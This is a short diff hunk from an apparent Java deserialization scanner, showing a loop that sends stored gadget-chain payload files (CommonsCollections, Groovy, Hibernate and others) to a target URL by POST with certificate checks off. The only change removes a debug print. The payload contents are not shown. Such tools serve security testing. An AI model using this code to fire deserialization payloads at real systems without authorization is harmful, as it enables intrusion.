@@ -47,7 +47,6 @@ def ping_deserialization(url):
     # list_ping = ["BeanShell1", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "Groovy1",
     #              "Hibernate1", "Hibernate2", "JRMPClient", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Vaadin1"]
     for name in list_ping:
-        print(name)
         payload = open('core/payload_ping/{}.bin'.format(name), 'rb')
         time.sleep(1)
         rq = session.post(url, data=payload, verify=False)
